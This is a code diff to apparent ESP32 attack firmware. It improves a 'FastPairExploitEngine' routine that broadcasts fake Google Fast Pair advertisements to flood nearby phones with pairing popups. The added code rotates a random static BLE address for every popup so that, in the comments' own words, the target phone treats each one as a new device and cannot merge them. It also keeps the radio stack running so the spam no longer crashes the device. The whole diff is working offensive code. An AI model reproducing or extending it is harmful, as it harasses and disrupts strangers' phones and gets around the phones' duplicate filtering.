@@ -28,6 +28,16 @@
 #include <esp_random.h>
 #include <globals.h>
 
+// Interface/host-level BLE MAC rotation without a controller teardown — used by
+// spamFastPairPopups(). Mirrors the guard pattern in ble_spam.cpp.
+#ifdef CONFIG_BT_NIMBLE_ENABLED
+#include "esp_mac.h"
+#if __has_include("host/ble_hs.h")
+#include "host/ble_hs.h"
+#define HAS_BLE_HS_H 1
+#endif
+#endif
+
 int showSubMenu(const char *title, const char *options[], int optionCount);
 
 extern tft_logger tft;
@@ -3390,31 +3400,66 @@ bool FastPairExploitEngine::exploitFastPairConnection(NimBLEAddress target, Fast
     return exploitSuccess;
 }
 
+// Rotate the advertised BLE address at the interface/host level WITHOUT tearing
+// the controller down. Mirrors bleSpamRestartAdvertiserForMac() in ble_spam.cpp:
+// the stack stays up, we only swap the random static address between popups.
+static void fastPairRotateAddress(const uint8_t *mac) {
+    esp_iface_mac_addr_set(mac, ESP_MAC_BT);
+#if defined(CONFIG_BT_NIMBLE_ENABLED) && defined(HAS_BLE_HS_H)
+    // ble_hs_id_set_rnd wants little-endian bytes; a valid random *static*
+    // address needs the two MSBs of the most-significant byte set to 0b11.
+    uint8_t addr_le[6];
+    addr_le[0] = mac[5] | 0xC0;
+    addr_le[1] = mac[4];
+    addr_le[2] = mac[3];
+    addr_le[3] = mac[2];
+    addr_le[4] = mac[1];
+    addr_le[5] = mac[0];
+    ble_hs_id_set_rnd(addr_le);
+    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+#endif
+}
+
 void FastPairExploitEngine::spamFastPairPopups(FastPairPopupType popupType, int count) {
+    // Bring the BLE stack up ONCE. The previous implementation called
+    // initBLE()/deinitBLE(true) *inside* the loop, tearing down and rebuilding the
+    // ESP32 BT controller for every popup. That rapid cycling races NimBLE's
+    // asynchronous host reset/sync and leaves the controller half-initialized,
+    // which reboots the device (LoadProhibited/abort — see core/radio_mem.h). Every
+    // other spam type in ble_spam.cpp inits once and loops; match that here.
+    if (!BLEStateManager::initBLE("", ESP_PWR_LVL_P9)) {
+        showAttackResult(false, "BLE init failed (free WiFi/SD first)");
+        return;
+    }
     AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+
+    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
+    if (!pAdvertising) {
+        showAttackResult(false, "No BLE advertiser");
+        return;
+    }
 
     showAttackProgress("Starting FastPair popup spam...", TFT_PURPLE);
 
     for (int i = 0; i < count; i++) {
         if (check(EscPress)) break;
 
+        // Rotate the advertised address each popup so the target phone treats
+        // each as a new device — a fixed address is de-duplicated into one popup.
+        // (The old code generated this MAC every iteration but never applied it.)
         uint8_t mac[6];
         generateRandomMac(mac);
         uint32_t modelId = selectModelForPopup(popupType);
 
-        BLEStateManager::initBLE("", ESP_PWR_LVL_P9);
-        NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
+        pAdvertising->stop();
+        fastPairRotateAddress(mac);
 
-        if (pAdvertising) {
-            uint8_t fpData[14];
-            createFastPairAdvertisement(fpData, modelId);
-            pAdvertising->setManufacturerData(fpData, sizeof(fpData));
-            pAdvertising->start(0);
-            delay(20);
-            pAdvertising->stop();
-        }
-
-        BLEStateManager::deinitBLE(true);
+        uint8_t fpData[14];
+        createFastPairAdvertisement(fpData, modelId);
+        pAdvertising->setManufacturerData(fpData, sizeof(fpData));
+        pAdvertising->start(0);
+        delay(20);
+        pAdvertising->stop();
         delay(50);
 
         if (i % 10 == 0) showAttackProgress(String("Sent " + String(i) + " popups").c_str(), TFT_PURPLE);
